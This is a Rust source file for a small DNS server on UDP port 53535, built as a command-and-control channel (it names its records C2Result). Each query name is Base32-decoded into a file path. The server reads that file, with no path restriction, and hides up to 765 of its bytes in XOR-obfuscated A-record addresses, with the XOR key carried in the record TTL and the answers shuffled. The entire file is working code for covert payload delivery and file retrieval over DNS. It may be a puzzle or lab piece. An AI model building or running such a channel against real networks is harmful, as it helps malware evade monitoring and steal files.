use std::net::Ipv4Addr;
use trust_dns;
use trust_dns::op::{Message, MessageType, OpCode, ResponseCode};
use trust_dns::rr::{RData, Record, RecordType};
use trust_dns::rr::domain::Name;
use rand::prelude::*;
use std::{fs, str};

#[macro_use] extern crate quick_error;

quick_error! {
  #[derive(Debug)]
  pub enum SomeError {
    UnknownError
    Io(err: std::io::Error) { from() }
    Utf8(err: std::str::Utf8Error) { from() }
    AddrParseError(err: std::net::AddrParseError) { from() }
    ProtoError(err: trust_dns::proto::error::ProtoError) { from() }
    //NoneError(err: std::option::NoneError) { from() }
  }
}

struct C2Result {
  ttl: u32,
  address: Ipv4Addr,
}

fn handle_incoming(name: &String) -> Result<Vec<C2Result>, SomeError> {
  let mut result: Vec<C2Result> = Vec::new();

  /* Convert the name from Base32 */
  let name = name.replace(".", "");
  let name = match base32::decode(base32::Alphabet::RFC4648 { padding: false }, &name) {
    Some(s) => s,
    None => return Err(SomeError::UnknownError),
  };
  let name = str::from_utf8(&name)?;

  let mut contents = fs::read_to_string(name)?;
  contents.truncate(255*3);
  let contents: Vec<u8> = contents.bytes().collect();
  let contents = contents.chunks(3);

  for (i, chunk) in contents.enumerate() {
    let ttl = rand::random::<u8>();

    let mut out = format!("{}", (i + 1) ^ (ttl as usize));
    out = format!("{}.{}", out, chunk[0] ^ ttl);

    if chunk.len() > 1 {
      out = format!("{}.{}", out, chunk[1] ^ ttl);
    } else {
      out = format!("{}.{}", out, 255 ^ ttl);
    }

    if chunk.len() > 2 {
      out = format!("{}.{}", out, chunk[2] ^ ttl);
    } else {
      out = format!("{}.{}", out, 255 ^ ttl);
    }

    result.push(C2Result { ttl: (ttl as u32) * 1000 + (rand::random::<u8>() as u32), address: out.parse()? });
  }

  /* Be a jerk and shuffle the results :) */
  let mut rng = rand::thread_rng();
  result.shuffle(&mut rng);

  return Ok(result);
}

fn go(incoming: Message, server: &std::net::UdpSocket, src: std::net::SocketAddr) -> Result<(), SomeError> {
  if incoming.queries().len() != 1 {
    return Err(SomeError::UnknownError);
  }

  let name = incoming.queries()[0].name().to_ascii();

  let mut outgoing = Message::new();
  outgoing.set_id(incoming.id())
        .set_message_type(MessageType::Response)
        .set_op_code(OpCode::Query)
        .set_authoritative(true)
        .set_recursion_desired(false)
        .set_recursion_available(false)
        .set_response_code(ResponseCode::NoError);

  let results = handle_incoming(&name)?;

  for result in results {
    let name = Name::from_ascii(&name)?;

    outgoing.add_answer(Record::from_rdata(
        name,
        result.ttl,
        RecordType::A,
        RData::A(result.address),
    ));
  }

  let outgoing = Message::to_vec(&outgoing)?;

  server.send_to(&outgoing, &src)?;
  return Ok(());
}

fn main() {
  let server = std::net::UdpSocket::bind(("0.0.0.0", 53535)).expect("Couldn't bind to 0.0.0.0:53535");

  println!("Server started!");

  loop {
    let mut incoming = [0; 4096];

    let src = match server.recv_from(&mut incoming) {
      Ok((_, s)) => s,
      Err(_) => continue,
    };
    println!("Connection from {}", src);

    let incoming = match Message::from_vec(&incoming) {
      Ok(s) => s,
      Err(_) => continue,
    };

    /* Ignore errors here */
    match go(incoming, &server, src) {
      Ok(_) => (),
      Err(e) => println!("Uh oh: {:?}", e),
    }
  }
}
